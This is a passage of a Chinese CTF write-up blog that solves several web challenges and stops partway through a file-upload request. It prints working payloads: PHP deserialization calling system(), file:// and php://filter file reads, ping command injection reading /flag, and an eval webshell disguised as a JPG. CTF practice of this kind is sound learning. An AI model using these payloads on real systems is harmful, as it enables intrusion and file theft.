<p>好像没有file_get_contents() ?</p>
<p>func&#x3D;file_get_contents;highlight_file&amp;p&#x3D;flag<br>&#x2F;&#x2F;不行</p>
<p>func&#x3D;file_get_contents&amp;p&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p>
<p>Warning: file_get_contents(&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.php): failed to open stream: No such file or directory in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 24</p>
<p>不行，看wp说要用反序列化，仔细看一眼源码<br>有个function __destruct()<br>改不会是这个？  </p>
<p>可这里也没有unserialize 啊<br>为什么是用反序列化？</p>
<p>原来func就直接传unserialize啊<br>对哦，它也是php的一个函数    </p>
<p>直接传</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;find / -name flag*&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br><br></code></pre></td></tr></table></figure>
<p>然后_destruct 就能触发了  </p>
<p>就能找到flag位置了</p>
<h1 id="NISACTF-2022-easyssrf"><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h1><p>给一个获取网页快照的功能<br>那不用猜就是有curl函数<br>扫一下目录没扫出东西  </p>
<p>抓包得到</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node7.anna.nssctf.cn:29484<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>26<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://node7.anna.nssctf.cn:29484<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://node7.anna.nssctf.cn:29484/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-mel">url=<span class="hljs-keyword">file</span>%3A%2F%2Findex.php</span><br></code></pre></td></tr></table></figure>
<p>f12 源码也没有功能源码  </p>
<p>输入file:&#x2F;&#x2F;&#x2F;flag<br>提示：<br>都说了这里看不了flag。。但是可以看看提示文件：&#x2F;fl4g  </p>
<p>file:&#x2F;&#x2F;&#x2F;fl4g  </p>
<p>你应该看看除了index.php，是不是还有个ha1x1ux1u.php  </p>
<p>file:&#x2F;&#x2F;&#x2F;ha1x1ux1u.php<br>不行</p>
<p>在url里直接访问ha1x1ux1u.php<br>得到：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;file&quot;</span>))&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你败了.&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//flag in /flag</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure>
<p>不能用file:&#x2F;&#x2F;<br>但是竟然有file_get_contents()那就能用php伪协议  </p>
<p>直接传入：<br><a target="_blank" rel="noopener" href="http://node7.anna.nssctf.cn:29484/ha1x1ux1u.php?file=/flag">http://node7.anna.nssctf.cn:29484/ha1x1ux1u.php?file=/flag</a>    </p>
<p>就拿到了flag?不用伪协议？</p>
<p>测试了一下，用php伪协议也可以：<br>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag<br>回显:<br>TlNTQ1RGezg4YmE0NWNjLTJlYTEtNGRiNS04MzY1LWMzOTA0MDFiNmQ5N30K</p>
<p>解码就是flag  </p>
<h1 id="LitCTF-2023-导弹迷踪"><a href="#LitCTF-2023-导弹迷踪" class="headerlink" title="[LitCTF 2023]导弹迷踪"></a>[LitCTF 2023]导弹迷踪</h1><p>老规矩，只玩一遍<br>f12 找到flag<br>flag字样被改为<br>F|L|A|G<br>直接搜搜不到的  </p>
<h1 id="NCTF-2018-签到题"><a href="#NCTF-2018-签到题" class="headerlink" title="[NCTF 2018] 签到题"></a>[NCTF 2018] 签到题</h1><p>找了半小时，cookie和请求头里面分别有两个假的flag  </p>
<p>真flag在源访问链接<br>即&#x2F;index.php的访问标头里  </p>
<h1 id="NSSCTF-2022-Spring-Recruit-ezgame"><a href="#NSSCTF-2022-Spring-Recruit-ezgame" class="headerlink" title="[NSSCTF 2022 Spring Recruit]ezgame"></a>[NSSCTF 2022 Spring Recruit]ezgame</h1><p>f12 直接找<br>或者修改前端都行  </p>
<h1 id="LitCTF-2023-Ping"><a href="#LitCTF-2023-Ping" class="headerlink" title="[LitCTF 2023]Ping"></a>[LitCTF 2023]Ping</h1><p>尝试一下ping我的blog，提示只能ping ip地址  </p>
<p>试了一下ping 我的服务ip 和 127.0.0.0<br>都是百分百丢包率  </p>
<p>不管了，抓包看看  </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node5.anna.nssctf.cn:29540<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>27<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://node5.anna.nssctf.cn:29540<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://node5.anna.nssctf.cn:29540/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-autoit">command=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>&amp;<span class="hljs-built_in">ping</span>=<span class="hljs-built_in">ping</span></span><br></code></pre></td></tr></table></figure>
<p>改一下看看  </p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">command</span>=/&amp;ping=<span class="hljs-keyword">ls</span><br><br>没回显<br><br><span class="hljs-keyword">command</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.0</span>|<span class="hljs-keyword">ls</span>&amp;ping=ping<br><br>/回显：<br><span class="hljs-built_in">index</span>.php<br>upload<br></code></pre></td></tr></table></figure>
<p>试了一下upload目录403  </p>
<p>那直接看根目录</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">command</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.0</span>|<span class="hljs-keyword">ls</span> /&amp;ping=ping<br><br>回显：<br>bin<span class="hljs-symbol">&lt;br&gt;</span><br>dev<span class="hljs-symbol">&lt;br&gt;</span><br>etc<span class="hljs-symbol">&lt;br&gt;</span><br>flag<span class="hljs-symbol">&lt;br&gt;</span><br>home<span class="hljs-symbol">&lt;br&gt;</span><br>lib<span class="hljs-symbol">&lt;br&gt;</span><br>media<span class="hljs-symbol">&lt;br&gt;</span><br>mnt<span class="hljs-symbol">&lt;br&gt;</span><br><span class="hljs-keyword">opt</span><span class="hljs-symbol">&lt;br&gt;</span><br>proc<span class="hljs-symbol">&lt;br&gt;</span><br>root<span class="hljs-symbol">&lt;br&gt;</span><br>run<span class="hljs-symbol">&lt;br&gt;</span><br>sbin<span class="hljs-symbol">&lt;br&gt;</span><br>srv<span class="hljs-symbol">&lt;br&gt;</span><br>sys<span class="hljs-symbol">&lt;br&gt;</span><br>tmp<span class="hljs-symbol">&lt;br&gt;</span><br>usr<span class="hljs-symbol">&lt;br&gt;</span><br>var<span class="hljs-symbol">&lt;br&gt;</span><br></code></pre></td></tr></table></figure>
<p>那接下来cat &#x2F;flag就行  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">command</span>=127.0.0.0|cat /flag&amp;<span class="hljs-attribute">ping</span>=ping<br></code></pre></td></tr></table></figure>
<p>拿到flag</p>
<h1 id="TGCTF-ezupload"><a href="#TGCTF-ezupload" class="headerlink" title="TGCTF ezupload"></a>TGCTF ezupload</h1><p>先上传一个正常的jpg   </p>
<p>回显  </p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">&#123;<span class="hljs-string">&quot;status_code&quot;</span>:<span class="hljs-number">403</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-char escape_">\u</span>7981<span class="hljs-char escape_">\u</span>6b62<span class="hljs-char escape_">\u</span>4fdd<span class="hljs-char escape_">\u</span>5b58<span class="hljs-char escape_">\u</span>4e3a<span class="hljs-char escape_">\u</span>8be5<span class="hljs-char escape_">\u</span>7c7b<span class="hljs-char escape_">\u</span>578b<span class="hljs-char escape_">\u</span>6587<span class="hljs-char escape_">\u</span>4ef6<span class="hljs-char escape_">\u</span>ff01&quot;</span>&#125;<br><br>unicode解码后的意思就是<br><br>文件内容包含非法字符，禁止上传！<br><br>我不明白  <br></code></pre></td></tr></table></figure>
<p>抓包传马看看：  </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:62381<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>355<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:62381<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary5Frc88R0NhJL8adt<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:62381/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary5Frc88R0NhJL8adt</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;name&quot;; filename=&quot;shell.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: aimage/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[zhong]);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary5Frc88R0NhJL8adt</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">上传文件</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary5Frc88R0NhJL8adt--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure>
<p>还是不行   </p>
<p>扫一下目录<br>看到有index.php.bak  </p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[17:07:56]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">419</span>B  - /index<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[17:07:57]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">419</span>B  - /index<span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.bak</span><br><span class="hljs-selector-attr">[17:10:56]</span> <span class="hljs-number">200</span> -   <span class="hljs-number">30</span>B  - /upload<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[17:10:57]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - /uploads  -&gt;  http:<span class="hljs-comment">//127.0.0.1/uploads/</span><br><span class="hljs-selector-attr">[17:10:57]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /uploads/<br></code></pre></td></tr></table></figure>
<p>访问一下uploads&#x2F;,403,顺便知道了服务端是nginx<br>那猜测一下会有upload.php.bak<br>给我猜对了   </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UPLOAD_PATH&#x27;</span>, <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/uploads/&#x27;</span>);<br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$status_code</span> = <span class="hljs-number">200</span>; <span class="hljs-comment">// 默认状态码为 200</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;php2&quot;</span>, <span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;htm&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>, PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$temp_file</span>);<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?&lt;/s&#x27;</span>, <span class="hljs-variable">$file_content</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件内容包含非法字符，禁止上传！&#x27;</span>;<br>                <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 表示禁止访问</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-variable">$file_name</span>;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                    <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件上传成功！&#x27;</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>                    <span class="hljs-variable">$status_code</span> = <span class="hljs-number">500</span>; <span class="hljs-comment">// 500 表示服务器内部错误</span><br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;<br>            <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 表示禁止访问</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>        <span class="hljs-variable">$status_code</span> = <span class="hljs-number">404</span>; <span class="hljs-comment">// 404 表示资源未找到</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 设置 HTTP 状态码</span><br><span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-variable">$status_code</span>);<br><br><span class="hljs-comment">// 输出结果</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>    <span class="hljs-string">&#x27;status_code&#x27;</span> =&gt; <span class="hljs-variable">$status_code</span>,<br>    <span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-variable">$msg</span>,<br>]);<br></code></pre></td></tr></table></figure>
<p>经测试，uploads&#x2F;index.php<br>回显：<br>File not found.  </p>
<p>并没有404<br>那应该就能用.user.ini的办法  </p>
<p>上传  </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:62381<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>331<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:62381<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryMjahAHXakvDQQiYS<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:62381/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryMjahAHXakvDQQiYS</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;name&quot;; filename=&quot;shell.jpg&quot;</span><br><span class="language-pgsql">Content-<span 